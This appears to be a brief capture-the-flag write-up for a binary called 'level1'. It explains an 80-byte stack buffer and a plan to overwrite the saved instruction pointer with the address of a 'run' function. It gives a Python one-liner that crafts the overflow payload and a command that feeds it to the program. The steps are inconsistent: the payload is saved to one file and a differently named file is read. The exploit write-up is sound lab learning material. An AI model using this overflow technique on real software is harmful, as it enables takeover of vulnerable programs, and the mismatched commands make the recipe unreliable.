# LEVEL1

## EXPLANATIONS

### BINARY BEHAVIOR
Allocated 80 bytes in esp
### EXPLOI STRATEGY
We can do a Buffer overflow by replacing last 4 byes by the address of run : 
Ox08048444   
to overwrite sEIP
### RUN COMMAND

```
python -c "print('A' * 76 + '\x08\x04\x84\x44'[::-1])" > /tmp/exploit_string 
cat /tmp/string - | ./level1
```
